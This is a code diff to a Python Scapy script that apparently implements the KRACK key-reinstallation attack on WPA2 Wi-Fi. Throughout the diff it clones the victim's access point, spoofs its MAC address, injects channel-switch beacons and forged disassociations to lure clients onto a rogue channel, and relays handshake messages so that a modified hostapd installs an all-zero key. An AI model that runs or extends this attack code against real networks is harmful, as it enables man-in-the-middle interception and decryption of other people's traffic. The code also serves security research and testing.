@@ -2,10 +2,16 @@
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
-import sys, os, struct, time, argparse, heapq, subprocess, atexit
+import sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, select
 from datetime import datetime
+from wpaspy import Ctrl
 
 # TODO:
+# - Forward frames properly from the real channel to the rogue channel so the client gets added by hostapd
+# - Option to continously send CSA beacon frames on the real channel
+#
+# - ACK frames of the real AP sent to ALL clients (currently we only call those of the targeted client)
+# - Handle forwarded messages that are too long (= stupid Linux kernel bug)
 # - When the client immediately sends data on the rogue channel, it will be deauthenticated by the rogue kernel
 # - Option to make a debug pcap capture
 
@@ -24,7 +30,7 @@ COLORCODES = { "gray"  : "\033[0;37m",
                "orange": "\033[0;33m",
                "red"   : "\033[0;31m" }
 
-loglevel = DEBUG
+loglevel = ALL
 def log(level, msg, color=None, showtime=True):
 	if level < loglevel: return
 	if level == DEBUG   and color is None: color="gray"
@@ -38,6 +44,24 @@ def log(level, msg, color=None, showtime=True):
 def xorstr(lhs, rhs):
 	return "".join([chr(ord(lb) ^ ord(rb)) for lb, rb in zip(lhs, rhs)])
 
+def strip_fcs(p):
+	# Scapy can't handle FCS field automatically
+	if p[RadioTap].present & 2 != 0:
+		rawframe = str(p[RadioTap])
+		pos = 8
+		while ord(rawframe[pos - 1]) & 0x80 != 0: pos += 4
+		
+		# If the TSFT field is present, it must be 8-bytes aligned
+		if p[RadioTap].present & 1 != 0:
+			pos += (8 - (pos % 8))
+			pos += 8
+
+		# Remove FCS if present
+		if ord(rawframe[pos]) & 0x10 != 0:
+			return Dot11(str(p[Dot11])[:-4])
+
+	return p[Dot11]
+
 def recv_dot11(socket):
 	p = socket.recv()
 	if p == None or not Dot11 in p: return None
@@ -45,7 +69,9 @@ def recv_dot11(socket):
 	if p[Dot11].FCfield & 0x20 != 0:
 		log(DEBUG, "Ignoring echoed injected frame: %s (0x%02X)" % (dot11_to_str(p), p[Dot11].FCfield))
 		return None
-	return p[Dot11]
+	else:
+		log(ALL, "Received frame: %s" % dot11_to_str(p))
+	return strip_fcs(p)
 
 def send_dot11(socket, p):
 	# Hack: set the More Data flag so we can detect injected frames
@@ -86,28 +112,30 @@ def dot11_to_str(p):
 	elif Dot11AssoResp in p:  return "AssoResp(status=%d)" % p[Dot11AssoResp].status
 	elif Dot11Disas in p:     return "Disas"
 	elif Dot11WEP in p:       return "EncryptedData(IV=%d)" % dot11_get_iv(p)
+	elif p.type == 1 and p.subtype == 11: return "BlockAck"
+	elif p.type == 1 and p.subtype == 13: return "Ack"
 	elif EAPOL in p:
 		if get_eapol_msgnum(p) != 0: return "EAPOL msg%d" % get_eapol_msgnum(p)
 		else:                        return repr(p)
 	return repr(p)			
 
-def construct_csa(channel):
-	switch_mode = 1		# STA should not Tx untill switch is completed
+def construct_csa(channel, count=1):
+	switch_mode = 1			# STA should not Tx untill switch is completed
 	new_chan_num = channel	# Channel it should switch to
-	switch_count = 1	# Immediately make the station switch
+	switch_count = count	# Immediately make the station switch
 
 	# Contruct the IE
 	payload = struct.pack("<BBB", switch_mode, new_chan_num, switch_count)
-	return struct.pack("<BB", IEEE_TLV_TYPE_CSA, len(payload)) + payload
+	return Dot11Elt(ID=IEEE_TLV_TYPE_CSA, info=payload)
 
-def append_csa(p, channel):
+def append_csa(p, channel, count=1):
 	el = p[Dot11Elt]
 	prevel = None
 	while isinstance(el, Dot11Elt):
 		prevel = el
 		el = el.payload
 
-	prevel.payload = construct_csa(channel)
+	prevel.payload = construct_csa(channel, count)
 
 	return p
 
@@ -132,7 +160,22 @@ def dot11_get_iv(p):
 		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (ord(wep.iv[2]) << 16)
 
 
-#### Man-in-the-middle Setup Code ####
+#### Man-in-the-middle Code ####
+
+def set_mac_address(iface, macaddr):
+	subprocess.check_output(["ifconfig", iface, "down"])
+	subprocess.check_output(["macchanger", "-m", macaddr, iface])
+	subprocess.check_output(["ifconfig", iface, "up"])
+
+def set_monitor_ack_address(iface, macaddr):
+	# TODO: Continuously monitor for beacons to see whether we remain on the proper channel
+	"""Add a virtual STA interface for ACK generation. This assumes nothing takes control of this
+       interface, meaning it remains on the current channel."""
+	sta_iface = iface + "sta"
+	subprocess.call(["iw", sta_iface, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+	subprocess.check_output(["iw", iface, "interface", "add", sta_iface, "type", "managed"])
+	subprocess.check_output(["macchanger", "-m", macaddr, sta_iface])
+	subprocess.check_output(["ifconfig", sta_iface, "up"])
 
 def print_rx(level, name, p, color=None, suffix=None):
 	if p[Dot11].type == 1: return
@@ -192,6 +235,9 @@ class NetworkConfig():
 
 	def write_config(self, iface):
 		TEMPLATE = """
+ctrl_interface=hostapd_ctrl
+ctrl_interface_group=0
+
 interface={iface}
 ssid={ssid}
 channel={channel}
@@ -218,11 +264,14 @@ wpa_passphrase=XXXXXXXX"""
 
 
 class ClientState():
+	Initializing, Connecting, GotMitm, AttackStarted, AttackFailed, AttackWorked = range(6)
+
 	def __init__(self, macaddr):
 		self.macaddr = macaddr
 		self.reset()
 
 	def reset(self):
+		self.state = Initializing
 		self.forward_frames = False
 		self.previv = None
 		self.prevkeystream = None
@@ -230,6 +279,9 @@ class ClientState():
 		self.msg3s = []
 		self.msg4 = None
 		self.krack_finished = False
+
+	def update_state(self, state):
+		self.state = state
 
 
 class KRAckAttack():
@@ -245,31 +297,47 @@ class KRAckAttack():
 
 		# This is set in case of targeted attacks
 		self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()
+		if self.clientmac is not None:
+			set_monitor_ack_address(self.nic_real, self.clientmac)
 
 		self.sock_real  = None
 		self.sock_rogue = None
 		self.clients = dict()
 		self.disas_queue = []
 
+	def hostapd_rx_mgmt(self, p):
+		log(DEBUG, "Sent frame to hostapd: %s" % dot11_to_str(p))
+		self.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]).encode("hex"))
+
 	def find_beacon(self, ssid):
 		p = sniff(count=1, timeout=2, lfilter=lambda p: get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
 		if p is None or len(p) < 1: return
-		self.beacon = p[0][Dot11]
+		self.beacon = strip_fcs(p[0])
 		self.apmac = self.beacon.addr2
 
-	def send_csa_beacon(self):
-		csabeacon = append_csa(self.beacon, self.netconfig.get_rogue_channel())
-		send_dot11(self.sock_real, csabeacon)
-		log(STATUS, "Injected CSA beacon", color="green")
+	def send_csa_beacon(self, numbeacons=1):
+		newchannel = self.netconfig.get_rogue_channel()
+
+		for i in range(numbeacons):
+			# FIXME: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
+			# followed by one with a value of 1. When starting with 1 it errors out.
+			csabeacon = append_csa(self.beacon, newchannel, 2)
+			send_dot11(self.sock_real, csabeacon)
+
+			csabeacon = append_csa(self.beacon, newchannel, 1)
+			send_dot11(self.sock_real, csabeacon)
+
+		log(STATUS, "Injected %d CSA beacons (new channel %d)" % (numbeacons, newchannel), color="green")
 
 	def send_disas(self, macaddr):
 		p = Dot11(addr1=macaddr, addr2=self.apmac, addr3=self.apmac)/Dot11Disas(reason=0)
 		send_dot11(self.sock_rogue, p)
-		log(STATUS, "Injected Disassociation to %s" % macaddr, color="green")
+		send_dot11(self.sock_real, p)
+		log(STATUS, "Injected Disassociation to %s on both channels" % macaddr, color="green")
 
 	def queue_disas(self, macaddr):
 		if macaddr in [macaddr for shedtime, macaddr in self.disas_queue]: return
-		heapq.heappush(self.disas_queue, (time.time() + 2, macaddr))
+		heapq.heappush(self.disas_queue, (time.time() + 0.5, macaddr))
 
 	def try_channel_switch(self, macaddr):
 		self.send_csa_beacon()
@@ -287,19 +355,20 @@ class KRAckAttack():
 
 		# 1. Clear any client state at rogue hostapd/kernel
 		deauth = framehdr/Dot11Deauth()
-		send_dot11(self.sock_rogue, deauth)
+		self.hostapd_rx_mgmt(deauth)
 
 		# 2. Inform hostapd/kernel of a new client to handle using magic sequence number 1337
 		auth = framehdr/Dot11Auth(algo="open", seqnum=0x10, status=0)
-		send_dot11(self.sock_rogue, auth)
+		self.hostapd_rx_mgmt(auth)
 
 		# 3. Inform hostapd of the encryption algorithm and options the client uses
 		assoc = framehdr/client.assocreq
-		send_dot11(self.sock_rogue, assoc)
+		self.hostapd_rx_mgmt(assoc)
 
 		# 4. Send the EAPOL msg4 to trigger installation of all-zero key by the modified hostapd
 		msg4 = framehdr/client.msg4
 		send_dot11(self.sock_rogue, msg4)
+		# TODO XXX FIXME: Also directly forward to hostapd
 
 		return True
 
@@ -318,7 +387,15 @@ class KRAckAttack():
 					log(WARNING, "Client %s is connecting to the AP on the real channel. MitM failed." % self.clientmac)
 
 				if p.addr2 in self.clients: del self.clients[p.addr2]
-				self.try_channel_switch(p.addr2)
+				#self.try_channel_switch(p.addr2) # FIXME TODO FIXME TODO FIXME
+				self.send_csa_beacon()
+				self.clients[p.addr2] = ClientState(p.addr2)
+				self.clients[p.addr2].forward_frames = True
+
+				# TODO XXX FIXME TODO XXX FIXME
+				self.hostapd_rx_mgmt(p)
+			elif Dot11AssoReq in p:
+				self.hostapd_rx_mgmt(p)
 
 			# Clients sending a deauthentication to the real AP are also interesting ...
 			elif Dot11Deauth in p:
@@ -356,8 +433,8 @@ class KRAckAttack():
 				if eapolnum == 3:
 					client.msg3s.append(p)
 					# FIXME: This may cause a timeout on the client side???
-					if len(client.msg3s) >= 3:
-						log(STATUS, "Got 3rd EAPOL msg3, will now forward all three msg3's", color="green", showtime=False)
+					if len(client.msg3s) >= 2:
+						log(STATUS, "Got 2nd EAPOL msg3, will now forward both msg3's", color="green", showtime=False)
 						for p in client.msg3s: send_dot11(self.sock_rogue, p)
 						client.msg3s = []
 					else:
@@ -400,12 +477,14 @@ class KRAckAttack():
 				self.clients[p.addr2] = ClientState(p.addr2)
 				self.clients[p.addr2].forward_frames = True
 				client = self.clients[p.addr2]
+				will_forward = True
 			# Otherwise check of it's an existing client we are tracking/MitM'ing
 			elif p.addr2 in self.clients:
 				client = self.clients[p.addr2]
-				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if client.forward_frames else None)
-			# Always display all frames sent the targeted client
-			elif p.addr1 == self.clientmac:
+				will_forward = client.forward_frames and (client.krack_finished or Dot11Auth in p or Dot11AssoReq in p or get_eapol_msgnum(p) == 2)
+				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
+			# Always display all frames sent by the targeted client
+			elif p.addr2 == self.clientmac:
 				print_rx(INFO, "Rogue channel", p)
 
 			# If this now belongs to a client we want to track, process the packet further
@@ -442,10 +521,15 @@ class KRAckAttack():
 
 						client.krack_finished = True
 
+					elif iv >= 3:
+						log(WARNING, "KRAck attack seems to have failed")
+						client.krack_finished = True
+
 					client.previv = iv
 					client.prevkeystream = keystream
 
-				if client.forward_frames: send_dot11(self.sock_real, p)
+				if will_forward:
+					send_dot11(self.sock_real, p)
 
 		# 3. Always display all frames sent by or to the targeted client
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
@@ -475,32 +559,45 @@ class KRAckAttack():
 		elif self.netconfig.real_channel > 13:
 			log(WARNING, "WARNING: Attack not yet tested against 5 GHz networks.")
 
+		# Set the MAC address of the rogue hostapd AP
+		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
+		set_mac_address(self.nic_rogue_ap, self.apmac)
+
 		# Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
-		log(ERROR, "TODO: Once modified hostapd is working properly, automatically start it")
 		with open("hostapd_rogue.conf", "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
-		# TODO: Clone the MAC address of the real AP
-		self.hostapd = subprocess.Popen(['../hostapd/hostapd', 'hostapd_rogue.conf'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
+		self.hostapd = subprocess.Popen(["../hostapd/hostapd", "hostapd_rogue.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-		# Inject a CSA beacon to push victims to our channel
-		for i in range(10): self.send_csa_beacon()
+		log(STATUS, "Giving the rogue hostapd two second to initialize ...")
+		time.sleep(2)
+
+		self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + self.nic_rogue_ap)
+		self.hostapd_ctrl.attach()
+
+		# Inject some CSA beacons to push victims to our channel
+		self.send_csa_beacon(numbeacons=10)
 
 		# Let the victim switch, then inject a Disassociation frame to trigger a new handshake
 		if self.clientmac is None: log(STATUS, "Note: no target client given, so cannot inject Disassociation to force new handshake(s)")
-		else:                      self.queue_disas(self.clientmac)
+		else:                      self.queue_disas(self.clientmac) # TODO XXX FIXME TODO uncomment
 
 		# Continue attack by monitoring both channels and performing needed actions
+		nextbeacon = time.time() + 0.01
 		while True:
-			sel = select([self.sock_rogue, self.sock_real], [], [], 0.5)
+			sel = select.select([self.sock_rogue, self.sock_real], [], [], 0.01)
 			if self.sock_real  in sel[0]: self.handle_rx_realchan()
 			if self.sock_rogue in sel[0]: self.handle_rx_roguechan()
 			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
 				self.send_disas(self.disas_queue.pop()[1])
+			if nextbeacon <= time.time():
+				#self.send_csa_beacon() # FIXME
+				nextbeacon += 0.01
 
 	def stop(self):
 		log(STATUS, "Closing hostapd ...")
 		if self.hostapd:
-			self.hostapd.kill()
+			self.hostapd.terminate()
+			self.hostapd.wait()
 
 def cleanup():
 	attack.stop()
@@ -519,8 +616,6 @@ if __name__ == "__main__":
 
 	if args.nic_rogue_mon is None:
 		args.nic_rogue_mon = args.nic_rogue_ap + "mon"
-
-	print args.nic_rogue_mon
 
 	attack = KRAckAttack(args.nic_real_ap, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.clientmac)
 
